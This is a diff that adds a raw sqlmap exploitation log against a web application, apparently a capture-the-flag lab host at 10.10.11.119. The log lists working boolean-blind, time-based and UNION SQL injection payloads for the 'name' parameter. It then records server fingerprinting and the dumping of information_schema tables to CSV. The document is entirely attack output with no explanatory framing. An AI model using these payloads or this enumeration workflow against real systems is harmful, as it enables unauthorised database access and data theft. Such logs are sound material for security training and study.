@@ -1,0 +1,231 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:30:31 /2022-03-24/
+
+[13:30:31] [INFO] resuming back-end DBMS 'mysql' 
+[13:30:31] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: name=admin') AND 5048=5048 AND ('DSTg'='DSTg
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=admin') AND (SELECT 5900 FROM (SELECT(SLEEP(5)))VdWE) AND ('oDmL'='oDmL
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: name=admin') UNION ALL SELECT NULL,NULL,CONCAT(0x716b6b6a71,0x43445972435844707479665054784f53446c414455726f5a75765766545a536756594b6b6e62785a,0x7162717071)-- -
+---
+[13:30:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[13:30:31] [INFO] fetching tables for database: 'information_schema'
+Database: information_schema
+[61 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_SYS_VIRTUAL                    |
+| INNODB_TEMP_TABLE_INFO                |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+[13:30:31] [INFO] fetching columns for table 'INNODB_SYS_FOREIGN_COLS' in database 'information_schema'
+[13:30:31] [INFO] fetching entries for table 'INNODB_SYS_FOREIGN_COLS' in database 'information_schema'
+[13:30:32] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[13:30:33] [WARNING] the SQL query provided does not return any output
+[13:30:33] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[13:30:33] [INFO] fetching number of entries for table 'INNODB_SYS_FOREIGN_COLS' in database 'information_schema'
+[13:30:33] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+
+[13:30:33] [INFO] retrieved: [13:30:33] [WARNING] unexpected HTTP code '500' detected. Will use (extra) validation step in similar cases
+
+
+[13:30:38] [INFO] retrieved: [13:30:38] [WARNING] time-based comparison requires larger statistical model, please wait..................... (done)
+[13:30:44] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[13:30:44] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[13:30:44] [WARNING] unable to retrieve the number of entries for table 'INNODB_SYS_FOREIGN_COLS' in database 'information_schema'
+[13:30:44] [INFO] fetching columns for table 'PROFILING' in database 'information_schema'
+[13:30:44] [INFO] fetching entries for table 'PROFILING' in database 'information_schema'
+[13:30:45] [INFO] fetching number of entries for table 'PROFILING' in database 'information_schema'
+[13:30:45] [INFO] resumed: 0
+[13:30:45] [WARNING] table 'PROFILING' in database 'information_schema' appears to be empty
+Database: information_schema
+Table: PROFILING
+[0 entries]
++----------+-----+-------+-------+----------+----------+------------+-------------+-------------+--------------+---------------+---------------+-----------------+-------------------+-------------------+-------------------+-------------------+---------------------+
+| QUERY_ID | SEQ | STATE | SWAPS | CPU_USER | DURATION | CPU_SYSTEM | SOURCE_FILE | SOURCE_LINE | BLOCK_OPS_IN | BLOCK_OPS_OUT | MESSAGES_SENT | SOURCE_FUNCTION | CONTEXT_VOLUNTARY | MESSAGES_RECEIVED | PAGE_FAULTS_MAJOR | PAGE_FAULTS_MINOR | CONTEXT_INVOLUNTARY |
++----------+-----+-------+-------+----------+----------+------------+-------------+-------------+--------------+---------------+---------------+-----------------+-------------------+-------------------+-------------------+-------------------+---------------------+
++----------+-----+-------+-------+----------+----------+------------+-------------+-------------+--------------+---------------+---------------+-----------------+-------------------+-------------------+-------------------+-------------------+---------------------+
+
+[13:30:45] [INFO] table 'information_schema.PROFILING' dumped to CSV file '/home/nn/.local/share/sqlmap/output/10.10.11.119/dump/information_schema/PROFILING.csv'
+[13:30:45] [INFO] fetching columns for table 'PLUGINS' in database 'information_schema'
+[13:30:45] [INFO] fetching entries for table 'PLUGINS' in database 'information_schema'
+Database: information_schema
+Table: PLUGINS
+[45 entries]
++-------------+--------------------+----------------+--------------------------------------------+---------------+----------------+----------------+----------------+---------------------------------------------------------------------------+---------------------+----------------------------+
+| LOAD_OPTION | PLUGIN_NAME        | PLUGIN_TYPE    | PLUGIN_AUTHOR                              | PLUGIN_STATUS | PLUGIN_LIBRARY | PLUGIN_LICENSE | PLUGIN_VERSION | PLUGIN_DESCRIPTION                                                        | PLUGIN_TYPE_VERSION | PLUGIN_LIBRARY_VERSION     |
++-------------+--------------------+----------------+--------------------------------------------+---------------+----------------+----------------+----------------+---------------------------------------------------------------------------+---------------------+----------------------------+
+| FORCE       | STORAGE ENGINE     | 1.0            | MySQL AB                                   | 50735.0       | GPL            | ACTIVE         | <blank>        | This is a pseudo storage engine to represent the binlog in a transaction  | <blank>             | binlog                     |
+| FORCE       | AUTHENTICATION     | 1.1            | R.J.Silk, Sergei Golubchik                 | 1.1           | GPL            | ACTIVE         | <blank>        | Native MySQL authentication                                               | <blank>             | mysql_native_password      |
+| FORCE       | AUTHENTICATION     | 1.1            | Oracle                                     | 1.1           | GPL            | ACTIVE         | <blank>        | SHA256 password authentication                                            | <blank>             | sha256_password            |
+| FORCE       | STORAGE ENGINE     | 1.0            | Brian Aker, MySQL AB                       | 50735.0       | GPL            | ACTIVE         | <blank>        | CSV storage engine                                                        | <blank>             | CSV                        |
+| FORCE       | STORAGE ENGINE     | 1.0            | MySQL AB                                   | 50735.0       | GPL            | ACTIVE         | <blank>        | Hash based, stored in memory, useful for temporary tables                 | <blank>             | MEMORY                     |
+| FORCE       | STORAGE ENGINE     | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | Supports transactions, row-level locking, and foreign keys                | <blank>             | InnoDB                     |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB transactions                                                       | <blank>             | INNODB_TRX                 |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB conflicting locks                                                  | <blank>             | INNODB_LOCKS               |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB which lock is blocking which                                       | <blank>             | INNODB_LOCK_WAITS          |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | Statistics for the InnoDB compression                                     | <blank>             | INNODB_CMP                 |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | Statistics for the InnoDB compression; reset cumulated counts             | <blank>             | INNODB_CMP_RESET           |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | Statistics for the InnoDB compressed buffer pool                          | <blank>             | INNODB_CMPMEM              |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | Statistics for the InnoDB compressed buffer pool; reset cumulated counts  | <blank>             | INNODB_CMPMEM_RESET        |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | Statistics for the InnoDB compression (per index)                         | <blank>             | INNODB_CMP_PER_INDEX       |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | Statistics for the InnoDB compression (per index); reset cumulated counts | <blank>             | INNODB_CMP_PER_INDEX_RESET |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB Buffer Page Information                                            | <blank>             | INNODB_BUFFER_PAGE         |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB Buffer Page in LRU                                                 | <blank>             | INNODB_BUFFER_PAGE_LRU     |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB Buffer Pool Statistics Information                                 | <blank>             | INNODB_BUFFER_POOL_STATS   |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB Temp Table Stats                                                   | <blank>             | INNODB_TEMP_TABLE_INFO     |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB Metrics Info                                                       | <blank>             | INNODB_METRICS             |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | Default stopword list for InnDB Full Text Search                          | <blank>             | INNODB_FT_DEFAULT_STOPWORD |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | INNODB AUXILIARY FTS DELETED TABLE                                        | <blank>             | INNODB_FT_DELETED          |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | INNODB AUXILIARY FTS BEING DELETED TABLE                                  | <blank>             | INNODB_FT_BEING_DELETED    |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | INNODB AUXILIARY FTS CONFIG TABLE                                         | <blank>             | INNODB_FT_CONFIG           |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | INNODB AUXILIARY FTS INDEX CACHED                                         | <blank>             | INNODB_FT_INDEX_CACHE      |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | INNODB AUXILIARY FTS INDEX TABLE                                          | <blank>             | INNODB_FT_INDEX_TABLE      |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_TABLES                                                         | <blank>             | INNODB_SYS_TABLES          |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_TABLESTATS                                                     | <blank>             | INNODB_SYS_TABLESTATS      |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_INDEXES                                                        | <blank>             | INNODB_SYS_INDEXES         |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_COLUMNS                                                        | <blank>             | INNODB_SYS_COLUMNS         |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_FIELDS                                                         | <blank>             | INNODB_SYS_FIELDS          |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_FOREIGN                                                        | <blank>             | INNODB_SYS_FOREIGN         |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_FOREIGN_COLS                                                   | <blank>             | INNODB_SYS_FOREIGN_COLS    |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_TABLESPACES                                                    | <blank>             | INNODB_SYS_TABLESPACES     |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_DATAFILES                                                      | <blank>             | INNODB_SYS_DATAFILES       |
+| FORCE       | INFORMATION SCHEMA | 5.7            | Oracle Corporation                         | 50735.0       | GPL            | ACTIVE         | <blank>        | InnoDB SYS_VIRTUAL                                                        | <blank>             | INNODB_SYS_VIRTUAL         |
+| FORCE       | STORAGE ENGINE     | 1.0            | MySQL AB                                   | 50735.0       | GPL            | ACTIVE         | <blank>        | MyISAM storage engine                                                     | <blank>             | MyISAM                     |
+| FORCE       | STORAGE ENGINE     | 1.0            | MySQL AB                                   | 50735.0       | GPL            | ACTIVE         | <blank>        | Collection of identical MyISAM tables                                     | <blank>             | MRG_MYISAM                 |
+| FORCE       | STORAGE ENGINE     | 0.1            | Marc Alff, Oracle                          | 50735.0       | GPL            | ACTIVE         | <blank>        | Performance Schema                                                        | <blank>             | PERFORMANCE_SCHEMA         |
+| ON          | STORAGE ENGINE     | 3.0            | Brian Aker, MySQL AB                       | 50735.0       | GPL            | ACTIVE         | <blank>        | Archive storage engine                                                    | <blank>             | ARCHIVE                    |
+| ON          | STORAGE ENGINE     | 1.0            | MySQL AB                                   | 50735.0       | GPL            | ACTIVE         | <blank>        | /dev/null storage engine (anything you write to it disappears)            | <blank>             | BLACKHOLE                  |
+| OFF         | STORAGE ENGINE     | 1.0            | Patrick Galbraith and Brian Aker, MySQL AB | 50735.0       | GPL            | DISABLED       | <blank>        | Federated MySQL storage engine                                            | <blank>             | FEDERATED                  |
+| ON          | STORAGE ENGINE     | 1.0            | Mikael Ronstrom, MySQL AB                  | 50735.0       | GPL            | ACTIVE         | <blank>        | Partition Storage Engine Helper                                           | <blank>             | partition                  |
+| ON          | FTPARSER           | 0.1            | Oracle Corp                                | 1.1           | GPL            | ACTIVE         | <blank>        | Ngram Full-Text Parser                                                    | <blank>             | ngram                      |
+| ON          | auth_socket        | AUTHENTICATION | Sergei Golubchik                           | ACTIVE        | auth_socket.so | GPL            | 1.1            | Unix Socket based authentication                                          | 1.1                 | 1.7                        |
++-------------+--------------------+----------------+--------------------------------------------+---------------+----------------+----------------+----------------+---------------------------------------------------------------------------+---------------------+----------------------------+
+
+[13:30:45] [INFO] table 'information_schema.PLUGINS' dumped to CSV file '/home/nn/.local/share/sqlmap/output/10.10.11.119/dump/information_schema/PLUGINS.csv'
+[13:30:45] [INFO] fetching columns for table 'TABLE_PRIVILEGES' in database 'information_schema'
+[13:30:45] [INFO] fetching entries for table 'TABLE_PRIVILEGES' in database 'information_schema'
+[13:30:46] [INFO] fetching number of entries for table 'TABLE_PRIVILEGES' in database 'information_schema'
+[13:30:46] [INFO] resumed: 0
+[13:30:46] [WARNING] table 'TABLE_PRIVILEGES' in database 'information_schema' appears to be empty
+Database: information_schema
+Table: TABLE_PRIVILEGES
+[0 entries]
++---------+------------+--------------+--------------+---------------+----------------+
+| GRANTEE | TABLE_NAME | IS_GRANTABLE | TABLE_SCHEMA | TABLE_CATALOG | PRIVILEGE_TYPE |
++---------+------------+--------------+--------------+---------------+----------------+
++---------+------------+--------------+--------------+---------------+----------------+
+
+[13:30:46] [INFO] table 'information_schema.TABLE_PRIVILEGES' dumped to CSV file '/home/nn/.local/share/sqlmap/output/10.10.11.119/dump/information_schema/TABLE_PRIVILEGES.csv'
+[13:30:46] [INFO] fetching columns for table 'INNODB_CMP_PER_INDEX_RESET' in database 'information_schema'
+[13:30:46] [INFO] fetching entries for table 'INNODB_CMP_PER_INDEX_RESET' in database 'information_schema'
+[13:30:47] [WARNING] the SQL query provided does not return any output
+[13:30:47] [INFO] fetching number of entries for table 'INNODB_CMP_PER_INDEX_RESET' in database 'information_schema'
+
+[13:30:47] [INFO] retrieved: 
+
+[13:30:48] [INFO] retrieved: 
+[13:30:48] [WARNING] unable to retrieve the number of entries for table 'INNODB_CMP_PER_INDEX_RESET' in database 'information_schema'
+[13:30:48] [INFO] fetching columns for table 'INNODB_FT_CONFIG' in database 'information_schema'
+[13:30:48] [INFO] fetching entries for table 'INNODB_FT_CONFIG' in database 'information_schema'
+[13:30:49] [WARNING] the SQL query provided does not return any output
+[13:30:49] [INFO] fetching number of entries for table 'INNODB_FT_CONFIG' in database 'information_schema'
+
+[13:30:49] [INFO] retrieved: 
+
+[13:30:51] [INFO] retrieved: 
+[13:30:51] [WARNING] unable to retrieve the number of entries for table 'INNODB_FT_CONFIG' in database 'information_schema'
+[13:30:51] [INFO] fetching columns for table 'INNODB_SYS_COLUMNS' in database 'information_schema'
+[13:30:51] [INFO] fetching entries for table 'INNODB_SYS_COLUMNS' in database 'information_schema'
+[13:30:52] [WARNING] the SQL query provided does not return any output
+[13:30:52] [INFO] fetching number of entries for table 'INNODB_SYS_COLUMNS' in database 'information_schema'
+
+[13:30:52] [INFO] retrieved: 
+
+[13:30:53] [INFO] retrieved: 
+[13:30:54] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 45 times
+
+
+[*] ending @ 13:30:54 /2022-03-24/
+
